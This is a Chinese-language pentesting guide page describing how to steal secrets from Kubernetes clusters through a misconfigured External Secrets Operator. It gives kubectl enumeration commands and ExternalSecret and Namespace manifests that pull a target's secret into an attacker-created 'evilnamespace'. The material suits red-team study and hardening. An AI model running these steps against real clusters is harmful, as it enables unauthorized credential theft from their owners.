# External Secret Operator

**该页面的原作者是** [**Fares**](https://www.linkedin.com/in/fares-siala/)

本页面提供了一些关于如何从配置错误的ESO或使用ESO同步其秘密的应用程序中窃取秘密的指引。

## 免责声明

下面展示的技术仅在满足某些条件时有效。例如，它依赖于允许在您拥有/已攻陷的命名空间中同步秘密的要求。您需要自己找出这些条件。

## 先决条件

1. 在具有命名空间管理员权限的kubernetes / openshift集群中获得立足点
2. 在集群级别对至少ExternalSecret具有读取权限
3. 确定是否需要任何必需的标签/注释或组成员资格，以允许ESO同步您的秘密。如果您运气好，您可以自由窃取任何定义的秘密。

### 收集有关现有ClusterSecretStore的信息

假设您有足够权限读取此资源的用户；首先列出现有的_**ClusterSecretStores**_。
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret 枚举

假设您找到了一个名为 _**mystore**_ 的 ClusterSecretStore。继续枚举其关联的 externalsecret。
```sh
kubectl get externalsecret -A | grep mystore
```
_这个资源是命名空间范围的，因此除非你已经知道要查找哪个命名空间，否则请添加 -A 选项以查看所有命名空间。_

你应该会得到一个定义的 externalsecret 列表。假设你找到了一个名为 _**mysecret**_ 的 externalsecret 对象，它由命名空间 _**mynamespace**_ 定义和使用。收集更多关于它持有什么类型的秘密的信息。
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### 组装各个部分

从这里你可以获取一个或多个秘密名称（如在 Secret 资源中定义的）。你将得到类似于以下的输出：
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
到目前为止，我们得到了：

- ClusterSecretStore 的名称
- ExternalSecret 的名称
- 秘密的名称

现在我们拥有了所需的一切，您可以创建一个 ExternalSecret（并最终修补/创建一个新的 Namespace，以符合同步新秘密所需的先决条件）：
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
在几分钟后，如果同步条件满足，您应该能够在您的命名空间中查看泄露的秘密。
```sh
kubectl get secret leaked_secret -o yaml
```
## 参考

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
